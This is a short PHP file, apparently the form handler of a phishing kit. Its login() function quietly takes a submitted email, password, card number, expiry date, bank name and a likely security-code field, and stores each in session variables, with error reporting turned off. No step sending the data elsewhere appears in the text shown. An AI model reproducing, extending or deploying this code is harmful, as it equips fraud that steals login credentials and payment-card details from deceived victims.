<?php
error_reporting(0);
session_start();
function login(){
$Eamil =  $_POST['e'];
$_SESSION['Eamil'] = $Eamil;
$Password = $_POST['p'];
$_SESSION['Password'] = $Password;
$Date = $_POST['exp1'];
$_SESSION['Date'] = $Date;
$Datte = $_POST['exp2'];
$_SESSION['Datte'] = $Datte;
$CC = $_POST['crd'];
$_SESSION['CC'] = $CC;
$CB = $_POST['bname'];
$_SESSION['CB'] = $CB;
$CR = $_POST['crr'];
$_SESSION['CR'] = $CR;
$CL = $_POST['Crd'];
$_SESSION['CL'] = $CL;
}
?>